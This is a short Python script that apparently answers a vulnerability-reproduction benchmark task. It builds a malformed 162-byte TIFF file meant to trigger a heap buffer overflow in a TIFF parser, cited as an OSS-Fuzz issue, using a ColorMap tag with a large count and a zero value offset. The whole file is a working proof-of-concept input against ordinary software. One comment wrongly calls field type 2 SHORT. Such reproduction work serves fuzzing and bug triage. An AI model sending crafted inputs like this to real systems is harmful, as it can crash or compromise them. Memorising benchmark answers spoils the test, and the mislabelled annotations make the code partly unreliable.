import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a TIFF file that triggers heap buffer overflow
        # Based on OSS-Fuzz issue 388571282: invalid offline tags with value offset zero
        
        # TIFF header (little-endian)
        header = struct.pack('<HH', 0x4949, 42)  # Little-endian, magic number
        
        # IFD offset (point to first IFD at position 8)
        ifd_offset = struct.pack('<I', 8)
        
        # First IFD: 2 entries
        ifd_count = struct.pack('<H', 2)
        
        # Entry 1: ImageWidth (tag 256) - LONG type, value fits in offset field
        entry1 = struct.pack('<HHL', 256, 4, 1)  # Tag, type=LONG, count=1
        entry1 += struct.pack('<I', 100)  # Value: width=100
        
        # Entry 2: Invalid offline tag with offset 0 (vulnerability trigger)
        # Use a tag that expects offset-based data
        entry2 = struct.pack('<HHL', 320, 2, 100)  # Tag 320 (ColorMap), type=SHORT, large count
        entry2 += struct.pack('<I', 0)  # Offset = 0 (INVALID - triggers overflow)
        
        # Next IFD offset (0 = end)
        next_ifd = struct.pack('<I', 0)
        
        # Assemble the complete TIFF
        tiff_data = header + ifd_offset + ifd_count + entry1 + entry2 + next_ifd
        
        # Pad to exactly 162 bytes (ground-truth length)
        # The padding ensures we match the exact size that triggers the bug
        if len(tiff_data) < 162:
            tiff_data += b'\x00' * (162 - len(tiff_data))
        elif len(tiff_data) > 162:
            tiff_data = tiff_data[:162]
        
        return tiff_data